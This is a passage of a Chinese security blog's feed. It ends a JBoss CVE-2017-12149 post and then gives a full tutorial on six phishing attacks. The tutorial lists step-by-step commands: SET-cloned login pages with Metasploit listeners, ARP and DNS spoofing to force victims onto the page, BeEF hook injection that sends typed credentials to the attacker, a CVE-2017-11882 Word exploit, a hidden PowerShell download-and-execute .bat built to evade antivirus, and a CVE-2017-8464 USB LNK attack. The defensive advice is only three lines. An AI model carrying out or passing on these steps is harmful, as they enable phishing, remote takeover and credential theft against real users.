<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180923_jatTku_6333.jpeg" alt=""></p>
<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h4 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-漏洞描述&quot;&gt;&lt;a href=&quot;#0x00-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x00. 漏洞描述&quot;&gt;&lt;/a&gt;0x00. 漏洞描述&lt;/h2&gt;&lt;h4 id=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;a href=&quot;#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot; class=&quot;headerlink&quot; title=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;/a&gt;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>花式钓鱼法</title>
    <link href="http://TimeS0ng.github.io/2017/12/27/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/"/>
    <id>http://TimeS0ng.github.io/2017/12/27/花式钓鱼法/</id>
    <published>2017-12-27T02:39:14.000Z</published>
    <updated>2018-12-18T14:54:41.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-闲谈"><a href="#0x00-闲谈" class="headerlink" title="0x00. 闲谈"></a>0x00. 闲谈</h2><h4 id="emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"><a href="#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。" class="headerlink" title="&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"></a>&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。</h4><a id="more"></a>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182440_peGRkR_6191.jpeg" alt=""></p>
<h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1). 环境准备："></a>1). 环境准备：</h3><h3 id="1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"><a href="#1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）" class="headerlink" title="1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"></a>1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）</h3><h3 id="2-windows-xp"><a href="#2-windows-xp" class="headerlink" title="2. windows xp"></a>2. windows xp</h3><h3 id="3-window-7"><a href="#3-window-7" class="headerlink" title="3. window 7"></a>3. window 7</h3><h1 id="情景一："><a href="#情景一：" class="headerlink" title="情景一："></a>情景一：</h1><blockquote>
<p>利用Java Applet 进行钓鱼，不过现在的浏览器已经开始禁止这些插件了，要利用这种情景最好先做好前期的信息收集，判断目标是否支持Java Applet</p>
</blockquote>
<h4 id="第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T"><a href="#第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T" class="headerlink" title="第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T"></a>第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T</h4><blockquote>
<p>git clone <a href="https://github.com/trustedsec/social-engineer-toolkit.git" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit.git</a></p>
</blockquote>
<h4 id="第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功"><a href="#第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功" class="headerlink" title="第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功"></a>第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功</h4><blockquote>
<p>vim /etc/setoolkit/set.config</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182513_m24bV3_6241.jpeg" alt=""></p>
<h4 id="第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;1&emsp;2&emsp;no&emsp;回车&emsp;2&emsp;www.baidu.com&emsp;1&emsp;443&emsp;1 </p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182524_72fK5L_6258.jpeg" alt=""></p>
<h4 id="第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"><a href="#第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听" class="headerlink" title="第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"></a>第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听</h4><blockquote>
<p>kill 0</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182535_47xLHO_6268.jpeg" alt=""></p>
<h4 id="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"><a href="#第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）" class="headerlink" title="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"></a>第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182544_uI1YdI_6356.jpeg" alt=""></p>
<hr>
<h1 id="情景二："><a href="#情景二：" class="headerlink" title="情景二："></a>情景二：</h1><blockquote>
<p>利用浏览器漏洞和中间人攻击进行钓鱼，不过这个漏洞已经比较老了，笔者只在xp上成功过，不过这里提供一种思路，万一哪天IE又抽风来个CVE…</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit </p>
<p>依次按照如下顺序：1&emsp;2&emsp;2&emsp;1&emsp;no&emsp;回车&emsp;5&emsp;37&emsp;2&emsp;443</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182556_R3oubQ_6381.jpeg" alt=""></p>
<h4 id="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"><a href="#第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个" class="headerlink" title="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"></a>第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个</h4><blockquote>
<p>kill 0</p>
<p>set srvport 80</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182608_ZogrCp_6390.jpeg" alt=""></p>
<h4 id="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章"><a href="#第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章" class="headerlink" title="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇文章"></a>第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇<a href="https://times0ng.github.io/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">文章</a></h4><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.110 -r 192.168.1.1</p>
<p>echo “192.168.1.111 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
<p>[*]进行DNS投毒时经常会失败，笔者对这种情况也有点不解，不过当我用xp的IE浏览器访问<a href="http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell" target="_blank" rel="external">http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell</a></p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182624_rBdD7y_6403.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182639_NQ1Zpz_6410.jpeg" alt=""></p>
<hr>
<h1 id="情景三："><a href="#情景三：" class="headerlink" title="情景三："></a>情景三：</h1><blockquote>
<p>钓鱼页面与beef结合，让鱼儿无处可逃</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面"><a href="#第一步：启动setookit-构造钓鱼页面" class="headerlink" title="第一步：启动setookit 构造钓鱼页面"></a>第一步：启动setookit 构造钓鱼页面</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;3&emsp;1&emsp;local IP(192.168.1.111)&emsp;5</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182652_6jCVOg_6432.jpeg" alt=""></p>
<h4 id="第二步：启动beef，将HOOK代码嵌入钓鱼页面"><a href="#第二步：启动beef，将HOOK代码嵌入钓鱼页面" class="headerlink" title="第二步：启动beef，将HOOK代码嵌入钓鱼页面"></a>第二步：启动beef，将HOOK代码嵌入钓鱼页面</h4><blockquote>
<p>vim ~/.set/web_clone/index.html</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182704_1tJrZ6_6441.jpeg" alt=""></p>
<h4 id="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"><a href="#第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上" class="headerlink" title="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"></a>第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上</h4><blockquote>
<p><a href="http://192.168.1.111" target="_blank" rel="external">http://192.168.1.111</a></p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182719_DRT0dh_6448.jpeg" alt=""></p>
<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182731_rP5b4s_6451.jpeg" alt=""></p>
<hr>
<h1 id="情景四："><a href="#情景四：" class="headerlink" title="情景四："></a>情景四：</h1><blockquote>
<p> 利用最新的word漏洞CVE-2017-11882钓鱼</p>
</blockquote>
<h4 id="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"><a href="#第一步：下载EXP，并将EXP集成到msf的fileformat模块当中" class="headerlink" title="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"></a>第一步：下载EXP，并将EXP集成到msf的fileformat模块当中</h4><blockquote>
<p>wget <a href="https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb" target="_blank" rel="external">https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</a></p>
<p>mv office_ms17_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182749_4NZ76L_6464.jpeg" alt=""></p>
<h4 id="第二步：启动msf生成钓鱼word"><a href="#第二步：启动msf生成钓鱼word" class="headerlink" title="第二步：启动msf生成钓鱼word"></a>第二步：启动msf生成钓鱼word</h4><blockquote>
<p>reload_all</p>
<p>use exploit/windows/fileformat/office_ms17_11882</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182803_yEBCcc_6474.jpeg" alt=""></p>
<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182814_BxOTQF_6481.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182825_2n8D2X_6483.jpeg" alt=""></p>
<hr>
<h1 id="情景五："><a href="#情景五：" class="headerlink" title="情景五："></a>情景五：</h1><blockquote>
<p>利用windows自带的powershell进行钓鱼，即发送bat文件，并将payload放到远程服务器，这样在一定程度上可以绕过杀软</p>
</blockquote>
<h4 id="第一步：下载并安装Empire，这里有Empire详细的使用教程"><a href="#第一步：下载并安装Empire，这里有Empire详细的使用教程" class="headerlink" title="第一步：下载并安装Empire，这里有Empire详细的使用教程"></a>第一步：下载并安装Empire，这里有Empire详细的<a href="https://xianzhi.aliyun.com/forum/topic/67/" target="_blank" rel="external">使用教程</a></h4><blockquote>
<p>git clone <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="external">https://github.com/EmpireProject/Empire</a></p>
</blockquote>
<h4 id="第二步：启动Empire生成payload"><a href="#第二步：启动Empire生成payload" class="headerlink" title="第二步：启动Empire生成payload"></a>第二步：启动Empire生成payload</h4><blockquote>
<p>launcher powershell times0ng</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182834_3NraFH_6547.jpeg" alt=""></p>
<h4 id="第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中"><a href="#第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中" class="headerlink" title="第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中"></a>第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中</h4><blockquote>
<p>service apache2 start</p>
<p>vim /var/www/html/empire.psl</p>
</blockquote>
<h4 id="第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"><a href="#第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软" class="headerlink" title="第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"></a>第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软</h4><blockquote>
<p>powershell -ExecutionPolicy Bypass -w hidden IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
<hr>
<h1 id="情景六："><a href="#情景六：" class="headerlink" title="情景六："></a>情景六：</h1><blockquote>
<p>利用USB社工钓鱼，记得当初看黑客军团时里面的黑客小姐姐就是利用BadUSB加社工黑进监狱的</p>
</blockquote>
<h4 id="第一步：利用msf生成攻击向量"><a href="#第一步：利用msf生成攻击向量" class="headerlink" title="第一步：利用msf生成攻击向量"></a>第一步：利用msf生成攻击向量</h4><blockquote>
<p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183113_tXAzGF_6507.jpeg" alt=""></p>
<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183126_dYJ5SW_6514.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183138_XzAql1_6518.jpeg" alt=""></p>
<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183152_b9Kxw1_6527.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183205_jgJnId_6529.jpeg" alt=""></p>
<hr>
<h2 id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02. 防御建议"></a>0x02. 防御建议</h2><h4 id="多了解攻击手段，以攻代防，知己知彼"><a href="#多了解攻击手段，以攻代防，知己知彼" class="headerlink" title="[*] 多了解攻击手段，以攻代防，知己知彼"></a>[*] 多了解攻击手段，以攻代防，知己知彼</h4><h4 id="不要轻易打开任何可执行文件"><a href="#不要轻易打开任何可执行文件" class="headerlink" title="[*] 不要轻易打开任何可执行文件"></a>[*] 不要轻易打开任何可执行文件</h4><h4 id="不要轻易点击陌生链接"><a href="#不要轻易点击陌生链接" class="headerlink" title="[*] 不要轻易点击陌生链接"></a>[*] 不要轻易点击陌生链接</h4><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"><a href="#emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…" class="headerlink" title="&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"></a>&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-闲谈&quot;&gt;&lt;a href=&quot;#0x00-闲谈&quot; class=&quot;headerlink&quot; title=&quot;0x00. 闲谈&quot;&gt;&lt;/a&gt;0x00. 闲谈&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
